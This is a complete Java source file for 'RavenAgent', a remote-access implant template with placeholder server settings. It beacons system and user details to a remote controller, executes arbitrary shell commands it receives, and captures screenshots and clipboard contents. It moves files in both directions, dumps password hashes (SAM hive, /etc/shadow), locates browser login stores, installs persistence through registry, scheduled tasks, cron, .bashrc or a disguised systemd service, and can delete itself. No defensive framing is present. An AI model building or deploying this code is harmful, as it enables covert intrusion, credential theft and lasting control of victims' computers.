import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import javax.net.ssl.*;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.security.KeyStore;
import java.security.cert.X509Certificate;

public class RavenAgent {

    static final String  Host          = "%%HOST%%";
    static final int     Port          = %%PORT%%;
    static final String  AgentId       = "%%AGENT_ID%%";
    static final String  Mode          = "%%MODE%%";
    static final String  KsPassword    = "%%KS_PASSWORD%%";
    static final boolean Persist       = %%PERSIST%%;
    static final boolean IsWindows     = System.getProperty("os.name", "").toLowerCase().contains("win");
    static final String  Shell         = IsWindows ? "cmd.exe" : "/bin/sh";
    static final String  ShellFlag     = IsWindows ? "/c"      : "-c";
    static final int     CmdTimeoutMs  = 30000;

    static volatile boolean Running    = true;
    static volatile long    SleepMs    = %%SLEEP_MS%%;
    static volatile long    JitterMs   = %%JITTER_MS%%;

    public static void main(String[] Args) {
        %%HIDE_CONSOLE%%
        Runtime.getRuntime().addShutdownHook(new Thread(() -> Running = false));
        do {
            try {
                switch (Mode.toUpperCase()) {
                    case "HTTP":  RunHttpBeacon(false); break;
                    case "HTTPS": RunHttpBeacon(true);  break;
                    default:      RunSocket();           break;
                }
            } catch (Exception Ex) {
                if (Persist) { try { Thread.sleep(NextSleep()); } catch (Exception Ignored) {} }
            }
        } while (Persist && Running);
    }

    static long NextSleep() {
        return SleepMs + (JitterMs > 0 ? (long)(Math.random() * JitterMs) : 0);
    }

    static String Beacon() {
        try {
            String Hostname = InetAddress.getLocalHost().getHostName();
            String OsName   = System.getProperty("os.name", "Unknown");
            String OsArch   = System.getProperty("os.arch", "Unknown");
            String Username = System.getProperty("user.name", "Unknown");
            long   Pid      = ProcessHandle.current().pid();
            return "{\"Type\":\"RAVEN\","
                + "\"ID\":\"" + AgentId + "\","
                + "\"Mode\":\"" + Mode + "\","
                + "\"OS\":\"" + OsName + "\","
                + "\"Arch\":\"" + OsArch + "\","
                + "\"User\":\"" + Username + "\","
                + "\"Host\":\"" + Hostname + "\","
                + "\"Pid\":\"" + Pid + "\"}";
        } catch (Exception Ex) {
            return "{\"Type\":\"RAVEN\",\"ID\":\"" + AgentId + "\",\"Mode\":\"" + Mode + "\"}";
        }
    }

    static void RunSocket() throws Exception {
        Socket Connection = ConnectSocket();
        try {
            Connection.setSoTimeout(0);
            PrintStream   Out = new PrintStream(Connection.getOutputStream(), true, StandardCharsets.UTF_8);
            BufferedReader In = new BufferedReader(new InputStreamReader(Connection.getInputStream(), StandardCharsets.UTF_8));
            Out.println(Beacon());
            String Line;
            while (Running && (Line = In.readLine()) != null) {
                Line = Line.trim();
                if (Line.isEmpty()) continue;
                if (Line.equals("__PING__")) { Out.print("__PONG__\u0000"); Out.flush(); continue; }
                if (Line.equalsIgnoreCase("exit") || Line.equalsIgnoreCase("quit")) break;
                String Result = Dispatch(Line);
                Out.print(Result);
                Out.print("\u0000");
                Out.flush();
            }
        } finally {
            try { Connection.close(); } catch (Exception Ignored) {}
        }
    }

    static Socket ConnectSocket() throws Exception {
        switch (Mode.toUpperCase()) {
            case "TLS":   return ConnectTls(false);
            case "MTLS":
            case "FMTLS": return ConnectTls(true);
            case "MULTI": {
                try { return ConnectTls(false); }
                catch (Exception Ignored) { return new Socket(Host, Port); }
            }
            default:      return new Socket(Host, Port);
        }
    }

    static Socket ConnectTls(boolean WithClientCert) throws Exception {
        KeyManager[] KeyManagers = null;
        TrustManager[] TrustManagers;
        if (WithClientCert) {
            KeyStore AgentKs = KeyStore.getInstance("PKCS12");
            try (InputStream AgentIn = new FileInputStream("agent.p12")) {
                AgentKs.load(AgentIn, KsPassword.toCharArray());
            }
            KeyManagerFactory KeyFact = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
            KeyFact.init(AgentKs, KsPassword.toCharArray());
            KeyManagers = KeyFact.getKeyManagers();
            KeyStore CaKs = KeyStore.getInstance("PKCS12");
            try (InputStream CaIn = new FileInputStream("ca.p12")) {
                CaKs.load(CaIn, KsPassword.toCharArray());
            }
            TrustManagerFactory TrustFact = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());
            TrustFact.init(CaKs);
            TrustManagers = TrustFact.getTrustManagers();
        } else {
            TrustManagers = new TrustManager[]{ new X509TrustManager() {
                public void checkClientTrusted(X509Certificate[] C, String A) {}
                public void checkServerTrusted(X509Certificate[] C, String A) {}
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
            }};
        }
        SSLContext Ctx = SSLContext.getInstance("TLS");
        Ctx.init(KeyManagers, TrustManagers, new java.security.SecureRandom());
        SSLSocket Sock = (SSLSocket) Ctx.getSocketFactory().createSocket(Host, Port);
        Sock.setEnabledProtocols(new String[]{"TLSv1.3", "TLSv1.2"});
        Sock.startHandshake();
        return Sock;
    }

    static void RunHttpBeacon(boolean UseTls) throws Exception {
        String Scheme    = UseTls ? "https" : "http";
        String BaseUrl   = Scheme + "://" + Host + ":" + Port;
        String SessionId = RegisterBeacon(BaseUrl, UseTls);
        if (SessionId == null || SessionId.isBlank()) throw new Exception("Beacon registration failed");
        while (Running) {
            Thread.sleep(NextSleep());
            String Command = PollBeacon(BaseUrl, SessionId, UseTls);
            if (Command == null || Command.isBlank()) continue;
            if (Command.equalsIgnoreCase("exit")) { Running = false; break; }
            String Result = Dispatch(Command);
            SubmitResult(BaseUrl, SessionId, Result, UseTls);
        }
    }

    static String RegisterBeacon(String BaseUrl, boolean UseTls) throws Exception {
        HttpURLConnection Conn = OpenHttp(BaseUrl + "/beacon/register", "POST", UseTls);
        Conn.setDoOutput(true);
        Conn.setRequestProperty("Content-Type", "application/json");
        Conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        byte[] Body = Beacon().getBytes(StandardCharsets.UTF_8);
        Conn.setFixedLengthStreamingMode(Body.length);
        Conn.getOutputStream().write(Body);
        Conn.getOutputStream().flush();
        String Response = ReadResponse(Conn);
        return ExtractField(Response, "session");
    }

    static String PollBeacon(String BaseUrl, String SessionId, boolean UseTls) throws Exception {
        HttpURLConnection Conn = OpenHttp(BaseUrl + "/beacon/poll?session=" + SessionId, "GET", UseTls);
        Conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        return ExtractField(ReadResponse(Conn), "cmd");
    }

    static void SubmitResult(String BaseUrl, String SessionId, String Result, boolean UseTls) throws Exception {
        HttpURLConnection Conn = OpenHttp(BaseUrl + "/beacon/result", "POST", UseTls);
        Conn.setDoOutput(true);
        Conn.setRequestProperty("Content-Type", "application/json");
        Conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        String Json = "{\"session\":\"" + SessionId + "\",\"output\":" + JsonQuote(Result) + "}";
        byte[] Body = Json.getBytes(StandardCharsets.UTF_8);
        Conn.setFixedLengthStreamingMode(Body.length);
        Conn.getOutputStream().write(Body);
        Conn.getOutputStream().flush();
        Conn.getResponseCode();
    }

    static HttpURLConnection OpenHttp(String Url, String Method, boolean UseTls) throws Exception {
        HttpURLConnection Conn;
        if (UseTls) {
            SSLContext Ctx = SSLContext.getInstance("TLS");
            Ctx.init(null, new TrustManager[]{ new X509TrustManager() {
                public void checkClientTrusted(X509Certificate[] C, String A) {}
                public void checkServerTrusted(X509Certificate[] C, String A) {}
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
            }}, new java.security.SecureRandom());
            HttpsURLConnection Https = (HttpsURLConnection) new URL(Url).openConnection();
            Https.setSSLSocketFactory(Ctx.getSocketFactory());
            Https.setHostnameVerifier((H, S) -> true);
            Conn = Https;
        } else {
            Conn = (HttpURLConnection) new URL(Url).openConnection();
        }
        Conn.setRequestMethod(Method);
        Conn.setConnectTimeout(10000);
        Conn.setReadTimeout(30000);
        return Conn;
    }

    static String ReadResponse(HttpURLConnection Conn) throws Exception {
        InputStream Stream;
        try { Stream = Conn.getInputStream(); }
        catch (Exception Ex) { Stream = Conn.getErrorStream(); }
        if (Stream == null) return "";
        return new String(Stream.readAllBytes(), StandardCharsets.UTF_8);
    }

    static String ExtractField(String Json, String Field) {
        if (Json == null) return null;
        String Key   = "\"" + Field + "\":\"";
        int    Start = Json.indexOf(Key);
        if (Start < 0) return null;
        Start += Key.length();
        int End = Json.indexOf('"', Start);
        return End > Start ? Json.substring(Start, End) : null;
    }

    static String JsonQuote(String Value) {
        if (Value == null) return "\"\"";
        return "\"" + Value
            .replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "")
            .replace("\t", "\\t")
            + "\"";
    }

    static String Dispatch(String Command) {
        if (Command == null || Command.isBlank()) return "";
        return Command.startsWith("raven:") ? RavenProtocol(Command.substring(6)) : Execute(Command);
    }

    static String RavenProtocol(String Directive) {
        int    Sep = Directive.indexOf(':');
        String Cmd = (Sep < 0 ? Directive : Directive.substring(0, Sep)).toLowerCase();
        String Arg =  Sep < 0 ? ""        : Directive.substring(Sep + 1);
        switch (Cmd) {
            case "ping":        return "PONG:" + AgentId;
            case "sleep":       return SetSleep(Arg);
            case "jitter":      return SetJitter(Arg);
            case "sysinfo":     return GatherSysinfo();
            case "screenshot":  return TakeScreenshot();
            case "download":    return ReadFile(Arg);
            case "upload":      return WriteFile(Arg);
            case "hashdump":    return DumpHashes();
            case "browserdump": return DumpBrowsers();
            case "clipboard":   return ReadClipboard();
            case "persist":     return InstallPersistence(Arg.isBlank() ? "default" : Arg);
            case "unpersist":   return RemovePersistence(Arg.isBlank() ? "default" : Arg);
            case "spawn":       return SpawnAgent();
            case "selfdestruct":SelfDestruct(); return "[terminated]";
            case "reconnect":   Running = false; return "[reconnecting]";
            case "portfwd":     return "[portfwd] not implemented";
            case "socks":       return "[socks] not implemented";
            case "pivot":       return "[pivot] not implemented";
            case "keylog":      return "[keylog] not implemented";
            default:            return "[unknown] " + Cmd;
        }
    }

    static String Execute(String Command) {
        try {
            ProcessBuilder Builder = new ProcessBuilder(Shell, ShellFlag, Command);
            Builder.redirectErrorStream(true);
            Process Proc = Builder.start();
            byte[] Output = Proc.getInputStream().readAllBytes();
            boolean Done  = Proc.waitFor(CmdTimeoutMs, TimeUnit.MILLISECONDS);
            if (!Done) { Proc.destroyForcibly(); return "[timeout]"; }
            return Output.length > 0 ? new String(Output, StandardCharsets.UTF_8).stripTrailing() : "[ok]";
        } catch (Exception Ex) { return "[error] " + Ex.getMessage(); }
    }

    static String SetSleep(String Arg) {
        try {
            long Seconds = Long.parseLong(Arg.trim());
            if (Seconds < 0) return "[error] sleep must be >= 0";
            SleepMs = Seconds * 1000L;
            return "[ok] sleep=" + Seconds + "s";
        } catch (Exception Ex) { return "[error] " + Arg; }
    }

    static String SetJitter(String Arg) {
        try {
            long Ms = Long.parseLong(Arg.trim());
            if (Ms < 0) return "[error] jitter must be >= 0";
            JitterMs = Ms;
            return "[ok] jitter=" + Ms + "ms";
        } catch (Exception Ex) { return "[error] " + Arg; }
    }

    static String GatherSysinfo() {
        StringBuilder Info = new StringBuilder();
        Info.append("AgentID   : ").append(AgentId).append("\n");
        Info.append("Mode      : ").append(Mode).append("\n");
        Info.append("OS        : ").append(System.getProperty("os.name")).append(" ").append(System.getProperty("os.version")).append("\n");
        Info.append("Arch      : ").append(System.getProperty("os.arch")).append("\n");
        Info.append("User      : ").append(System.getProperty("user.name")).append("\n");
        Info.append("Home      : ").append(System.getProperty("user.home")).append("\n");
        Info.append("Java      : ").append(System.getProperty("java.version")).append("\n");
        Info.append("PID       : ").append(ProcessHandle.current().pid()).append("\n");
        Info.append("SleepMs   : ").append(SleepMs).append("\n");
        Info.append("JitterMs  : ").append(JitterMs).append("\n");
        Info.append("Server    : ").append(Host).append(":").append(Port).append("\n");
        return Info.toString().stripTrailing();
    }

    static String TakeScreenshot() {
        try {
            java.awt.Robot Robot  = new java.awt.Robot();
            java.awt.Rectangle R  = new java.awt.Rectangle(java.awt.Toolkit.getDefaultToolkit().getScreenSize());
            java.awt.image.BufferedImage Img = Robot.createScreenCapture(R);
            ByteArrayOutputStream Buf = new ByteArrayOutputStream();
            javax.imageio.ImageIO.write(Img, "png", Buf);
            return "[screenshot:base64] " + Base64.getEncoder().encodeToString(Buf.toByteArray());
        } catch (Exception Ex) { return "[error] " + Ex.getMessage(); }
    }

    static String ReadFile(String Path) {
        try {
            byte[] Data = Files.readAllBytes(Paths.get(Path.trim()));
            return "[file:base64] " + Base64.getEncoder().encodeToString(Data);
        } catch (Exception Ex) { return "[error] " + Ex.getMessage(); }
    }

    static String WriteFile(String Arg) {
        try {
            int Split = Arg.indexOf(' ');
            if (Split < 0) return "[error] usage: upload <path> <base64>";
            String TargetPath = Arg.substring(0, Split).trim();
            byte[] Data = Base64.getDecoder().decode(Arg.substring(Split + 1).trim());
            Files.write(Paths.get(TargetPath), Data);
            return "[ok] wrote " + Data.length + " bytes to " + TargetPath;
        } catch (Exception Ex) { return "[error] " + Ex.getMessage(); }
    }

    static String DumpHashes() {
        return IsWindows
            ? Execute("reg save HKLM\\SAM sam.bak 2>&1 && echo SAM saved")
            : Execute("cat /etc/shadow 2>/dev/null || echo permission denied");
    }

    static String DumpBrowsers() {
        if (IsWindows) return Execute("dir /b \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" 2>&1");
        return Execute("find ~/.config/google-chrome ~/.mozilla -name 'logins.json' -o -name 'Login Data' 2>/dev/null | head -20");
    }

    static String ReadClipboard() {
        try {
            java.awt.datatransfer.Clipboard Cb = java.awt.Toolkit.getDefaultToolkit().getSystemClipboard();
            Object Content = Cb.getData(java.awt.datatransfer.DataFlavor.stringFlavor);
            return Content != null ? Content.toString() : "[clipboard empty]";
        } catch (Exception Ex) { return "[error] " + Ex.getMessage(); }
    }

    static String InstallPersistence(String Method) {
        if (IsWindows) {
            switch (Method.toLowerCase()) {
                case "registry": return Execute("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RavenAgent /t REG_SZ /d \"javaw -cp . RavenAgent\" /f");
                case "schtask":  return Execute("schtasks /create /tn RavenAgent /tr \"javaw -cp . RavenAgent\" /sc onlogon /f");
                default:         return Execute("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RavenAgent /t REG_SZ /d \"javaw -cp . RavenAgent\" /f");
            }
        }
        switch (Method.toLowerCase()) {
            case "cron":    return Execute("(crontab -l 2>/dev/null; echo '@reboot cd $HOME && java -cp . RavenAgent') | crontab -");
            case "bashrc":  return Execute("echo 'nohup java -cp . RavenAgent >/dev/null 2>&1 &' >> ~/.bashrc");
            case "systemd": return InstallSystemd();
            default:        return Execute("(crontab -l 2>/dev/null; echo '@reboot cd $HOME && java -cp . RavenAgent') | crontab -");
        }
    }

    static String InstallSystemd() {
        try {
            String ServicePath = System.getProperty("user.home") + "/.config/systemd/user/raven.service";
            String Content = "[Unit]\nDescription=System Service\nAfter=network.target\n"
                + "[Service]\nExecStart=java -cp . RavenAgent\nRestart=always\nRestartSec=10\n"
                + "[Install]\nWantedBy=default.target\n";
            new File(ServicePath).getParentFile().mkdirs();
            Files.writeString(Paths.get(ServicePath), Content);
            Execute("systemctl --user daemon-reload");
            Execute("systemctl --user enable --now raven.service");
            return "[ok] systemd service installed";
        } catch (Exception Ex) { return "[error] " + Ex.getMessage(); }
    }

    static String RemovePersistence(String Method) {
        if (IsWindows) {
            switch (Method.toLowerCase()) {
                case "registry": return Execute("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RavenAgent /f");
                case "schtask":  return Execute("schtasks /delete /tn RavenAgent /f");
                default:         return Execute("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RavenAgent /f");
            }
        }
        return Execute("crontab -l 2>/dev/null | grep -v RavenAgent | crontab -; systemctl --user disable --now raven.service 2>/dev/null; rm -f ~/.config/systemd/user/raven.service");
    }

    static String SpawnAgent() {
        String Cmd = IsWindows ? "javaw -cp . RavenAgent" : "nohup java -cp . RavenAgent >/dev/null 2>&1 &";
        Execute(Cmd);
        return "[ok] spawned";
    }

    static void SelfDestruct() {
        Running = false;
        try {
            String SelfPath = RavenAgent.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
            Execute(IsWindows ? "del /f /q \"" + SelfPath + "\"" : "rm -f \"" + SelfPath + "\"");
        } catch (Exception Ignored) {}
        System.exit(0);
    }
}
